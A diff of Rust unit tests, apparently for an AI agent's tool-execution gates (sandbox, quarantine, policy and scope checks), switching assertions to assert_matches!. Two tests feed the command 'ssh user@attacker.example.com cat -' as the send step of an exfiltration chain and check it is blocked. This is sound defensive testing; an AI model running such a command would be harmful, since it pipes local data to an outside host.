@@ -1424,6 +1424,7 @@ pub(crate) async fn run_daemon(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::assert_matches;
     use zeph_config::channels::A2aServerConfig;
     use zeph_config::providers::{ProviderEntry, ProviderKind, SttConfig};
     use zeph_llm::any::AnyProvider;
@@ -1792,8 +1793,9 @@ mod tests {
             skill_name: None,
         };
         let result = base_executor.execute_tool_call(&call).await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::SandboxViolation { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::SandboxViolation { .. }),
             "expected SandboxViolation from DiagnosticsExecutor, got {result:?}"
         );
     }
@@ -1867,8 +1869,9 @@ mod tests {
         let second = base_executor
             .execute_tool_call(&bash_call("ssh user@attacker.example.com cat -"))
             .await;
-        assert!(
-            matches!(second, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            second,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected the exfil_read_then_send chain to block the second call, got {second:?}"
         );
         assert_eq!(
@@ -1935,8 +1938,9 @@ mod tests {
         let second = base_executor
             .execute_tool_call(&bash_call("ssh user@attacker.example.com cat -"))
             .await;
-        assert!(
-            matches!(second, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            second,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected the exfil_read_then_send chain to still block the second call even \
              though its legs landed in different turns, got {second:?}"
         );
@@ -1988,11 +1992,9 @@ mod tests {
             skill_name: None,
         };
         let result = base_executor.execute_tool_call(&call).await;
-        assert!(
-            matches!(
-                result,
-                Err(zeph_tools::ToolError::ConfirmationRequired { .. })
-            ),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::ConfirmationRequired { .. }),
             "expected ConfirmationRequired for diagnostics under Supervised autonomy, got {result:?}"
         );
     }
@@ -2099,27 +2101,27 @@ mod tests {
         let memory_result = gated
             .execute_tool_call(&daemon_test_call("memory_save"))
             .await;
-        assert!(
-            matches!(memory_result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            memory_result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "memory_save must be denied under Quarantine, got {memory_result:?}"
         );
 
         let mcp_result = gated
             .execute_tool_call(&daemon_test_call(&mcp_tool_id))
             .await;
-        assert!(
-            matches!(mcp_result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            mcp_result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "MCP-sourced tool must be denied under Quarantine, got {mcp_result:?}"
         );
 
         let skill_load_result = gated
             .execute_tool_call(&daemon_test_call("load_skill"))
             .await;
-        assert!(
-            matches!(
-                skill_load_result,
-                Err(zeph_tools::ToolError::Blocked { .. })
-            ),
+        assert_matches!(
+            skill_load_result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "load_skill must be denied under Quarantine, got {skill_load_result:?}"
         );
 
@@ -2193,8 +2195,9 @@ mod tests {
             skill_name: None,
         };
         let result = gated.execute_tool_call(&call).await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from PolicyGateExecutor deny rule, got {result:?}"
         );
     }
@@ -2278,8 +2281,9 @@ mod tests {
         let policy_denied = gated
             .execute_tool_call(&daemon_test_call("overflow_flush"))
             .await;
-        assert!(
-            matches!(policy_denied, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            policy_denied,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from PolicyGateExecutor's own deny rule, got {policy_denied:?}"
         );
 
@@ -2289,11 +2293,9 @@ mod tests {
         let quarantine_denied = gated
             .execute_tool_call(&daemon_test_call("load_skill"))
             .await;
-        assert!(
-            matches!(
-                quarantine_denied,
-                Err(zeph_tools::ToolError::Blocked { .. })
-            ),
+        assert_matches!(
+            quarantine_denied,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from TrustGateExecutor's Quarantine enforcement, got {quarantine_denied:?}"
         );
 
@@ -2365,8 +2367,9 @@ mod tests {
             skill_name: None,
         };
         let result = gated.execute_tool_call(&call).await;
-        assert!(
-            matches!(result, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            result,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from AdversarialPolicyGateExecutor deny decision, got {result:?}"
         );
     }
@@ -2432,8 +2435,9 @@ mod tests {
         let denied = scoped
             .execute_tool_call(&daemon_test_call("diagnostics"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::OutOfScope { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::OutOfScope { .. }),
             "expected OutOfScope from ScopedToolExecutor for a tool outside the configured \
              scope, got {denied:?}"
         );
@@ -2526,8 +2530,9 @@ mod tests {
         let denied = gated
             .execute_tool_call(&daemon_test_call("diagnostics"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::Blocked { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::Blocked { .. }),
             "expected Blocked from PolicyGateExecutor's deny rule, got {denied:?}"
         );
         assert_eq!(
@@ -2604,8 +2609,9 @@ mod tests {
         let denied = scoped
             .execute_tool_call(&daemon_test_call("diagnostics"))
             .await;
-        assert!(
-            matches!(denied, Err(zeph_tools::ToolError::OutOfScope { .. })),
+        assert_matches!(
+            denied,
+            Err(zeph_tools::ToolError::OutOfScope { .. }),
             "expected OutOfScope from ScopedToolExecutor for a tool outside the configured \
              scope, got {denied:?}"
         );
